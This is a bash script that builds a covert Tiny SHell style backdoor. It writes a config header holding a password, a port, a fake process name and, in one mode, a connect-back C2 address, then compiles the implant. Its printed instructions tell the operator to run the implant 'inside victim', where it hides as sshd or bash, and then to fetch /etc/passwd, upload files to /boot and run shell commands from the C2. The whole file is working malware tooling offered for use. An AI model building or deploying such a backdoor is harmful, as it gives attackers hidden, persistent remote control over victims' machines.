#/bin/bash

usage() {
    cat <<EOF
Usage:
* MODE1: Backdoor listens on a port
    * \`$0 listener <system> <listening_port> [password] [fake_process_name]\`
        * Ex. \`$0 listener linux 8081 mypassword /usr/sbin/sshd\`
* MODE2: Backdoor periodically connects back to a c2_ip:c2_port
    * \`$0 connector <system> <c2_ip> <c2_port> [delay_seconds] [password] [fake_process_name]\`
        * Ex. \`$0 connector linux 8.8.8.8 8081 60 mypassword /bin/bash\`

Avaialble systems:
$(make 2>&1|grep '^\s*make'|sed 's/[[:space:]]*make/-/g')
EOF
}

main() {
    cd "$(dirname "$(realpath $0)")"
    test "$1" = "listener" && compile_listening_backdoor "$@" && return 0
    test "$1" = "connector" && compile_connecting_backdoor "$@" && return 0
    return 1
}

compile_listening_backdoor() {
    local SYSTEM="$2"
    local LISTEN_PORT="$3"
    local PASSWORD="${4:-$(rand_pass)}"
    local FAKE_PROC_NAME="${5:-/usr/sbin/sshd}"

    cat > tsh.h <<_EOF
#ifndef _TSH_H
#define _TSH_H

char *secret = "$PASSWORD";

#define SERVER_PORT $LISTEN_PORT

#define FAKE_PROC_NAME "$FAKE_PROC_NAME"

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
_EOF

    make "$SYSTEM" || return 1

    cat <<EOF
======= Backdoor Usage =======

PASSWORD: $PASSWORD

1. Execute \`./tshd\` inside victim (it will hide itself as "$FAKE_PROC_NAME" and listen on port "$LISTEN_PORT")
2. Exeucte \`./tsh\` on your C2 as the following and win:
  - \`./tsh <victim_ip> get /etc/passwd .\`
  - \`./tsh <victim_ip> put vmlinuz /boot\`
  - \`./tsh <victim_ip> "uname -a"\`
EOF
}

rand_pass() {
    dd if=/dev/urandom count=32 2>/dev/null|md5sum|egrep -o [0-9a-fA-F]{32}
}

compile_connecting_backdoor() {
    local SYSTEM="$2"
    local C2_IP="$3"
    local C2_PORT="$4"
    local DELAY_SECONDS="${5:-30}"
    local PASSWORD="${6:-$(rand_pass)}"
    local FAKE_PROC_NAME="${7:-/bin/bash}"
    cat > tsh.h <<_EOF
#ifndef _TSH_H
#define _TSH_H

char *secret = "$PASSWORD";

#define SERVER_PORT $C2_PORT
#define CONNECT_BACK_HOST  "$C2_IP"
#define CONNECT_BACK_DELAY $DELAY_SECONDS

#define FAKE_PROC_NAME "$FAKE_PROC_NAME"

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
_EOF

    make "$SYSTEM" || return 1

    cat <<EOF
======= Backdoor Usage =======

PASSWORD: $PASSWORD

1. Execute \`./tshd\` inside victim (it will hide itself as "$FAKE_PROC_NAME" and connect back to "$C2_IP:$C2_PORT" every $DELAY_SECONDS seconds)
2. Exeucte \`./tsh cb\` on your C2 to get a shell in $DELAY_SECONDS seconds, or:
    - \`./tsh cb get /etc/passwd .\`
    - \`./tsh cb put vmlinuz /boot\`
    - \`./tsh cb "uname -a"\`
EOF
}

main "$@" || { usage; exit; }